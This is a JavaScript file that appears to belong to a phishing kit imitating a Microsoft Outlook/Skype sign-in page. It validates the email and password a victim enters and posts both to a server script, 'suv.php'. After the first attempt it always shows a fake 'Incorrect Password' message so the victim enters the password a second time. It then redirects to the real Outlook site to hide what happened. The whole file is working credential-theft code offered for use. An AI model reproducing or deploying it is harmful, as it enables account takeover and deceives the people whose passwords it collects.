var email = document.getElementById('email');
var password = document.getElementById('password');
var counter = 0;


$('#nextx').click(function(e){
	e.preventDefault();
	var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
	var alertx = document.querySelector('.alertx');
	

	
	if($('#email').val() == ""){
		$('#email').focus();
		alertx.style.color = "red";
		alertx.textContent = "Enter a valid email address, phone number, or Skype name.";
		return false;
	}else if(!($('#email').val().match(checkmail))){
		$('#email').focus();
		alertx.style.color = "red";
		alertx.textContent = "Enter a valid email address, phone number, or Skype name.";
		return false;
	}else if($('#password').val() == ""){
		$('#password').focus();
		alertx.style.color = "red";
		alertx.textContent = "Please enter a valid password for your email account";
		return false;
	}else{
		counter = counter + 1;
		alertx.style.color = "#0073C6";
		alertx.textContent = "Logging you in...";
		$('.alertx').show();

		if(counter > 1){
			var xmlhttp;
		    if(window.XMLHttpRequest){
		      xmlhttp = new XMLHttpRequest();
		    }else{
		      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		    }

		    xmlhttp.onreadystatechange=function(){
		      if(xmlhttp.readyState==4 && xmlhttp.status==200){
				window.location = "https://outlook.live.com/owa/";
		      }
		    }

		    var email = document.getElementById('email').value;
		    var password = document.getElementById('password').value;
		    var formdata = new FormData();

	    	formdata.append("email", email);
	    	formdata.append("password", password);

		    var url = 'suv.php?others';
		    
		    xmlhttp.open("POST", url);
		    xmlhttp.send(formdata);

		    return false;
		}else{
			var xmlhttp;
		    if(window.XMLHttpRequest){
		      xmlhttp = new XMLHttpRequest();
		    }else{
		      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		    }

		    xmlhttp.onreadystatechange=function(){
		      if(xmlhttp.readyState==4 && xmlhttp.status==200){
					document.getElementById('password').value = "";
					alertx.style.color = "red";
					alertx.textContent = "Incorrect Password";
		      }
		    }

		    var email = document.getElementById('email').value;
		    var password = document.getElementById('password').value;
		    var formdata = new FormData();

	    	formdata.append("email", email);
	    	formdata.append("password", password);

		    var url = 'suv.php?others';
		    
		    xmlhttp.open("POST", url);
		    xmlhttp.send(formdata);

		    return false;		
		}	
	}

})